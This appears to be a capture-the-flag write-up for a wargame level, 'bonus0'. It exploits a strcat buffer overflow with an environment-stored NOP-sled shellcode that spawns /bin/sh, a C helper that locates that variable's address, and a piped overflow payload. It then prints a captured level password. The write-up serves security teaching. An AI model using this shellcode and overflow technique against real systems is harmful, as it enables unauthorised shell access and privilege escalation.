# Bonus0

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./bonus0
    -
  
    -
  
  $> ./bonus0
    - 
  teststring
    -
  salut
  teststring salut
```

> Seems like this program want us to input two string before printing them out.

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). After a closer look, we can see that this program is using `strcat()` known for its overflow overruns.

For this exploit, we need:

- Tinkering a [Shellcode](https://en.wikipedia.org/wiki/Shellcode) and get its address.
- Find the offset of one buffer to inject it (**9** bytes in our case).

> We need to use a Shellcode in this situation because our buffer are **20** bytes long, we need **12** bytes at minimum to perform a [ret2libc](https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3) attack as we did previously but we only have **11** bytes here.

Let's get the shellcode from [this article](https://0xrick.github.io/binary-exploitation/bof5/) but more working ones can be found on [shell-storm](http://shell-storm.org/shellcode/) or [exploit-db](https://www.exploit-db.com/).

```shell
$> export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
```

> Using a lot of `NOP` instructions before the Shellcode helps us to consistently find it even if the environment address shifts a bit as `NOP` instruction will only indicate to go to the next one until we find the first "real" instruction.

Then, we'll need to find where this environment variable is stored in memory. For that nothing really difficult...

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
  printf("env address at %p\n", getenv(argv[1]));
  return (0);
}
```

> Using this program with `SHELLCODE` as parameter will output where this environment variable is stored in memory.

Now all we have to do is filling up the first buffer with **4096** bytes, shift **9** bytes into the second one, input the address of the Shellcode and fill the remaining space with junk (7 **bytes**) to get a shell.
```shell
  $> (python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\xXX\xXX\xXX\xXX'[::-1] + '\x90' * 7"; cat) | ./bonus0
   -
   -
  r r
  $ cat /home/user/bonus1/.pass
  cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

So next user credentials pair is `bonus1:cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`.

Check [here](./source.c) for reproduction source-code of this binary.